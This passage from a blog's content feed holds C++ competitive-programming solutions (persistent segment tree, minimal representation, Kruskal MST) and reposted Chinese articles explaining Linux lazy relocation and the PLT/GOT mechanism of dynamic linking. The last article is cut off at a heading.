L-&gt;lson-&gt;val &gt;= k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">ask</span>(L-&gt;lson, R-&gt;lson, l, mid, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">ask</span>(L-&gt;rson, R-&gt;rson, mid + <span class="number">1</span>, r, k - (R-&gt;lson-&gt;val - L-&gt;lson-&gt;val));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(num[i]);</span><br><span class="line">        disc[i] = num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(disc + <span class="number">1</span>, disc + <span class="number">1</span> + n);</span><br><span class="line">    tot = <span class="built_in">unique</span>(disc + <span class="number">1</span>, disc + <span class="number">1</span> + n) - disc - <span class="number">1</span>;</span><br><span class="line">    his[<span class="number">0</span>] = &amp;tree[++cnt];</span><br><span class="line">    <span class="built_in">build</span>(his[<span class="number">0</span>], <span class="number">1</span>, tot);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        num[i] = <span class="built_in">lower_bound</span>(disc + <span class="number">1</span>, disc + <span class="number">1</span> + tot, num[i]) - disc;</span><br><span class="line">        his[i] = &amp;tree[++cnt];</span><br><span class="line">        <span class="built_in">insert</span>(his[i - <span class="number">1</span>], his[i], <span class="number">1</span>, tot, num[i], <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(l, r, k);</span><br><span class="line">        <span class="built_in">print</span>(disc[<span class="built_in">ask</span>(his[l - <span class="number">1</span>], his[r], <span class="number">1</span>, tot, k)]), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="最小表示法"><a href="#最小表示法" class="headerlink" title="最小表示法"></a>最小表示法</h1><p><strong>洛谷P1368</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> val[N &lt;&lt; <span class="number">1</span>], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(val[i]);</span><br><span class="line">        val[i + n] = val[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>, q = <span class="number">2</span>, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (p &lt;= n &amp;&amp; q &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n &amp;&amp; val[p + k] == val[q + k]; ++k);</span><br><span class="line">        <span class="keyword">if</span> (k == n) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (val[p + k] &gt; val[q + k]) &#123;</span><br><span class="line">            p += k + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (p == q) ++p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            q += k + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (p == q) ++q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = <span class="built_in">min</span>(p, q), q = p + n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (;p &lt;= q; ++p) <span class="built_in">print</span>(val[p]), <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h1><p><strong>洛谷P3366</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5009</span>, M = <span class="number">2e5</span> + <span class="number">9</span>;;</span><br><span class="line"><span class="type">int</span> n, m, f[N], ans, cnt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;</span><br><span class="line">    <span class="type">int</span> u, v, w;</span><br><span class="line">&#125;edge[M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmod</span><span class="params">(EDGE a, EDGE b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.w &lt; b.w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (f[x] == x) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(edge[i].u, edge[i].v, edge[i].w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(edge + <span class="number">1</span>, edge + <span class="number">1</span> + m, cmod);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) f[i] = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        u = edge[i].u, v = edge[i].v, w = edge[i].w;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">find</span>(u) == <span class="built_in">find</span>(v)) <span class="keyword">continue</span>;</span><br><span class="line">        ++cnt;</span><br><span class="line">        ans += w;</span><br><span class="line">        f[<span class="built_in">find</span>(u)] = <span class="built_in">find</span>(v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cnt != n - <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;orz&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">print</span>(ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0002 plt表和got表2</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0002-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A82/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51636753">聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>在前文（转载1）中，介绍解决动态库函数调用使用GOT表技术，然后PLT从GOT中获取地址并完成调用。这个前提是GOT必须在PLT执行之前，所有函数都已完成运行时重定位。</p>
<p>然而在Linux的世界里面，几乎所有可能的事情，都尽可能地延迟推后，直至无法退避时，才做最后的修正工作。典型的案例有：</p>
<ol>
<li>fork之后父子进程内存的写时拷贝机制</li>
<li>Linux用户态内存空间分配与物理内存分配机制</li>
<li>C++库的string类写时拷贝机制</li>
</ol>
<p>当然，也少不了动态链中的延迟重定位机制。</p>
<h2 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h2><p>如果可执行文件调用的动态库函数很多时，那在进程初始化时都对这些函数做地址解析和重定位工作，大大增加进程的启动时间。所以Linux提出延迟重定位机制，只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>进程启动时，先不对GOT表项做重定位，等到要调用该函数时才做重定位工作。要实现这个机制必须要有一个状态描述该GOT表项是否已完重定位。</p>
<p>一个显而易见的方案是在GOT中增加一个状态位，描述一个GOT表项是否已完成重定位，那么每个函数就有两个GOT表项了。相应的PLT伪代码如何：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">printf</span>@got[<span class="number">0</span>] ！= RELOCATED) &#123; <span class="comment">// 如果没完成重定位</span></span><br><span class="line">        <span class="comment">//调用重定位函数</span></span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">1</span>] = 地址解析发现的<span class="built_in">printf</span>地址;</span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">0</span>] = RELOCATED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jmp *<span class="built_in">printf</span>@got[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方案每个函数使用两个GOT表项，占用内存明显增长了一倍。但仔细观察GOT表项中的状态位和真实地址项，这两项在任何时候都不会同时使用，那么这两个变量能复用一个GOT项来实现呢？答案是可以的，Linux动态链接器就使用类似的巧妙方案，将这两个GOT表项合二为一。</p>
<p>具体怎么做呢？很简单，先将上面的代码倒过来写：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在链接成可执行文件test时，链接器将printf@got表项的内容填写lookup_printf标签的地址。</strong></p>
<p>也即是程序第一次调用printf是时，通过printf@got表项引导到查找printf的plt指令的后半部分。在后半部分中跳到动态链接器中将printf址解析出来，并重定位回printf@got项内。</p>
<p>那么神奇的作用来，第二次调用printf时，通过printf@got直接跳到printf函数执行了。</p>
<p>下面是test可执行文件，通过objdump -d test &gt; test.asm命令反编译之后生成汇编代码，可以看到整个跳转过程。</p>
<p>下面是test.asm文件中与PLT/GOT相关的部分，并对一些容易引起误解的地方做了修改。</p>
<p><img src="/image/post/transship/0002/1.jpg" alt=""></p>
<p>我将第一项plt表修改成<code>&lt;common@plt&gt;</code>项了，objdump -d输出结果会使用错误的符号名。那是因为该项是没有符号的，而objdump输出时，给它找了一个地址接近符号，所以会显示错误的符号名，为了避免引起误解，直接删掉。</p>
<p>每个plt指令中的jmp *0xf80496xx 都是访问相应的got项。在函数第一次调用之前，这些got项的内容都是链接器生成的，它的值指向对应plt中jmp的下一条指令。</p>
<p>下面是使用gdb命令，查看test可执行文中函数的got表内容，如下：</p>
<p><img src="/image/post/transship/0002/1.jpg" alt=""></p>
<p>将两张图对照一下，就可以看到前面说到的规律。</p>
<p>最后所有plt都跳转到common@plt中执行，这是动态链接做符号解析和重定位的公共入口，而不是每个plt表都有重复的一份指令。为了减少PLT指令条数，Linux提炼成了公共函数。从这一点来看，Linux也是拼了。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0004 plt表和got表4</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0004-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51893258">聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="编译时的PLT和GOT关系图"><a href="#编译时的PLT和GOT关系图" class="headerlink" title="编译时的PLT和GOT关系图"></a>编译时的PLT和GOT关系图</h2><p>前几篇文章一直在讨论PLT和GOT的结构细节，编译完成之后，PLT和GOT的对应关系是怎么样的呢，下面是编译完成之后，PLT和GOT关系图。</p>
<p><img src="/image/post/transship/0004/1.jpg" alt=""></p>
<p>图中重点标注了从调用printf函数语句的汇编指令call puts@plt跳转过程，图中使用编号来表标跳转顺序。</p>
<p><strong>PLT</strong>表结构有以下特点：</p>
<ol>
<li>PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）</li>
<li>每项PLT都从对应的GOT表项中读取目标函数地址</li>
</ol>
<p><strong>GOT</strong>表结构有以下特点：</p>
<ol>
<li>GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充</li>
<li>3个特殊项后面依次是每个动态库函数的GOT表项</li>
</ol>
<p>如果将PLT和GOT抽象起来描述，可以写成以下的伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">plt[<span class="number">0</span>]:</span><br><span class="line">  pushl got[<span class="number">1</span>]</span><br><span class="line">  jmp  *got[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">plt[n]:                <span class="comment">// n &gt;= 1</span></span><br><span class="line">  jmp *got[n+<span class="number">2</span>]        <span class="comment">// GOT前3项为公共项，第3项开始才是函数项，plt[1]对应的GOT[3]，依次类推</span></span><br><span class="line">  push (n<span class="number">-1</span>)*<span class="number">8</span></span><br><span class="line">  jmp plt[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">got[<span class="number">0</span>]  = address of .dynamic section</span><br><span class="line">got[<span class="number">1</span>]  = address of link_map object<span class="comment">//( 编译时填充0）</span></span><br><span class="line">got[<span class="number">2</span>]  = address of _dl_runtime_resolve function <span class="comment">//(编译时填充为0)</span></span><br><span class="line">got[n+<span class="number">2</span>]  = plt[n] + <span class="number">6</span> <span class="comment">//(即plt[n]代码片段的第二条指令）</span></span><br></pre></td></tr></table></figure>
<h2 id="进程启动后的GOT表"><a href="#进程启动后的GOT表" class="headerlink" title="进程启动后的GOT表"></a>进程启动后的GOT表</h2><p>PLT属于代码段，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能发生变化的是GOT表。</p>
<p>Linux加载进程时，通过execve系统调用进入内核态，将镜像加载到内存，然后返回用户态执行。返回用户态时，它的控制权并不是交给可执行文件，而是给动态链接器去完成一些基础的功能，比如上述的GOT[1]，GOT[2]的填写就是这个阶段完成的。下图是动态链接器填完GOT[1]，GOT[2]后的GOT图：</p>
<p><img src="/image/post/transship/0004/2.jpg" alt=""></p>
<p>估计大家比较好奇的是，动态链接器怎么知道GOT的首地址？这个秘密就藏在ELF的.dynamic段里面，详见下面<code>readelf -d test</code>输出结果中的<strong>PLTGOT</strong>项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ivan@ivan:~/test/test$ readelf -d test</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x600 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048274</span><br><span class="line"> 0x0000000d (FINI)                       0x8048488</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x80495f4</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x80495f8</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0x8048168</span><br><span class="line"> 0x00000005 (STRTAB)                     0x80481e0</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x8048190</span><br><span class="line"> 0x0000000a (STRSZ)                      74 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x80496ec</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x804825c</span><br><span class="line"> 0x00000011 (REL)                        0x8048254</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048234</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x804822a</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
<p>其实.dynamic段还藏着很多其它信息，都是跟动态运行相关的信息，有兴趣的读者可以自行分析，这里不详细介绍。</p>
<h2 id="动态重定位执行过程"><a href="#动态重定位执行过程" class="headerlink" title="动态重定位执行过程"></a>动态重定位执行过程</h2><p>Linux 动态链接器提供动态重位功能，所有外部函数只有调用时才做重定位，实现延迟绑定功能。下面是以调用puts函数为例画出了整个动态重定位的执行过程：</p>
<p><img src="/image/post/transship/0004/3.jpg" alt=""></p>
<p>在 _dl_runtime_resolve函数内完成puts符号查找后，将该函数地址地址重定位到对应的GOT表项，并调用。</p>
<h2 id="重定位之后的调用"><a href="#重定位之后的调用" class="headerlink" title="重定位之后的调用"></a>重定位之后的调用</h2><p>GOT表项已完成重定位的情况下，PLT利用GOT表直接调用到真实的动态库函数，下面puts函数的调用过程：</p>
<p><img src="/image/post/transship/0004/4.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于PLT和GOT的原理，一共分享了以下知识点：</p>
<ol>
<li>为什么会有PLT和GOT表，它完成什么功能</li>
<li>Linux如何通过 PLT和GOT表配合，完成延迟重定位功能</li>
<li>PLT和GOT的结构是怎么样的，并且介绍每种场景下PLT的执行过程</li>
</ol>
<p>关于PLT/GOT的基本知识写到这样就有清晰的认识了，但是Linux还有其它场景也会使用PLT/GOT，以后遇到时再展开讨论。</p>
<p>最后，本系列文章所有二进制分析，都是基于以下代码编译出来的可执行文件（32位）进行分析。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体编译方法参考（转载1）。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0005 plt表和got表5</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0005-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A85/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文转载自知乎，仅用作存储用。</p>
<p><a href="https://zhuanlan.zhihu.com/p/558522498">再看动态链接中的PLT和GOT - 读懂原理与细节</a></p>
<p>作者主页：<a href="https://www.zhihu.com/people/li-jian-hong-13-63">红色的红</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img src="/image/post/transship/0005/1.jpg" alt="原背景"></p>
<center>原背景</center>

<ul>
<li>魔鬼都藏在细节中, 不深入细节我总以为我已经懂了. 此文就是用于解决所有细节的落脚。</li>
</ul>
<h2 id="待解决的疑问："><a href="#待解决的疑问：" class="headerlink" title="待解决的疑问："></a>待解决的疑问：</h2><ul>
<li>动态库中的PLT表与主程序中的PLT表是否为同一份。</li>
<li>动态库中的GOT.PLT表与主程序中的GOT.PLT表是否为同一份。</li>
<li>PLT表是代码还是数据。</li>
<li>动态库内部函数之间的调用为何不直接使用相对地址调用。</li>
</ul>
<hr>
<ul>
<li>由于<code>.plt</code>段的作用(用于延时加载)不是 这篇文章的重点. 我们都知道其延时加载的原理和基本方法.这里就不额外展开说明这一点.可以参考内容[1][2].</li>
</ul>
<h2 id="代码准备"><a href="#代码准备" class="headerlink" title="代码准备"></a>代码准备</h2><ul>
<li>简单对代码作一个说明:</li>
<li><code>add.so</code> 会被编译为一个动态库. 里面包含两个函数:<ul>
<li>addtwo 完成两个数的加法.</li>
<li>addthree 完成</li>
</ul>
</li>
</ul>
<h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a><code>main.c</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个外部导入的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addtwo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">addthree</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = addtwo(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;1+2=%d\n&quot;</span>,sum);</span><br><span class="line">  sum = addthree(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;1+2+3=%d\n&quot;</span>,sum);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态库-add-so"><a href="#动态库-add-so" class="headerlink" title="动态库: add.so"></a>动态库: <code>add.so</code></h3><p>源文件: <code>add.c</code></p>
